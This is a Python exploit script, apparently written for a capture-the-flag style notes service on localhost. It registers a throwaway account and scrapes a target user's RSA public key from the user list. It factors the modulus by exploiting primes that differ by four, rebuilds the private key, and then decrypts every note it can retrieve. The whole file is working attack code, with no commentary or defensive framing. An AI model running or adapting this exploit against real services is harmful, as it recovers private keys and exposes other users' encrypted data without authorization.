import rsa
from httpx import AsyncClient
from bs4 import BeautifulSoup
import asyncio
import random
import string
import math
import base64

url = "http://localhost:5050"
target_email = ""

def format_rsa_public_key(key_str):
    key_str = key_str.replace(" ", "").replace("\n", "")
    formatted_key = "-----BEGIN RSA PUBLIC KEY-----\n"
    
    # Split the key into 64-character lines
    for i in range(0, len(key_str), 64):
        formatted_key += key_str[i:i+64] + "\n"
    
    formatted_key += "-----END RSA PUBLIC KEY-----\n"
    return formatted_key

def decryption_of_message(cipher_string, private_key):
    private_key = rsa.PrivateKey.load_pkcs1(private_key.encode())
    cipher_string = base64.b64decode(cipher_string)
    cipher_array = [cipher_string[i:i+64] for i in range(0, len(cipher_string), 64)]
    plaintext = ""
    for cipher in cipher_array:
        plaintext += rsa.decrypt(cipher, private_key).decode()
    return plaintext

def expprime(publickey):
    n = publickey.n
    e = publickey.e
    p = math.isqrt(n + 4)-2
    q = p + 4
    # Calculate private exponent
    d = rsa.common.inverse(e, (p-1)*(q-1))

    # Generate RSA key object
    private_key = rsa.PrivateKey(n, e, d, p, q)
    return private_key

async def exploit():
    client = AsyncClient(base_url=url)
    email_me = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + "@example.com"
    response = await client.post(
        "/sign-up",
        data={
            "email": email_me,
            "firstName": "1111",
            "public_key": None,
            "password1": "1111111",
            "password2": "1111111",
        }
    )
    print(response.text)
    response = await client.get("/userlist", follow_redirects=True)
    soup = BeautifulSoup(response.text, "html.parser")
    li = soup.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = filter(lambda x: target_email + '\n' in x, li)
    li = filter(lambda x: x != '' and x != '\n' and x != target_email + '\n', list(li)[0])
    public_key = list(li)
    public_key = public_key[1].strip()
    public_key = format_rsa_public_key(public_key)
    key = rsa.PublicKey.load_pkcs1(public_key.encode())
    private_key = expprime(key)
    private_key = private_key.save_pkcs1().decode()
    print(private_key)



    get_all_notes = await client.get("/")
    soup_html = BeautifulSoup(get_all_notes.text, "html.parser")
    li = soup_html.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    #strip
    li = [x.strip() for sublist in li for x in sublist]
    li = [x for x in li if x != '']
    #li = filter(lambda x: 'b' in x, li)
    #print(list(li))

    for i in li:
        try:
            message = i
            message = message[2:-1]
            message = message.encode()
            message = message.decode('unicode_escape').encode('latin-1')
            decrypted_message = decryption_of_message(message, private_key)
            print(decrypted_message)
        except:
            pass
        


if __name__ == "__main__":
    asyncio.run(exploit())


